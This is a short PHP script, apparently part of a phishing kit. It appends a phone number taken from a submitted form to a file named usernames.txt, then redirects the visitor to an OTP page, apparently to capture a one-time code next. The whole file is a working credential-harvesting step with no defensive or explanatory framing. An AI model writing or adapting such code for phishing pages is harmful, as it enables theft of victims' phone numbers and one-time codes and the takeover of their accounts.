<?php

    file_put_contents("usernames.txt", "Number: " . $_POST['phone_number'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
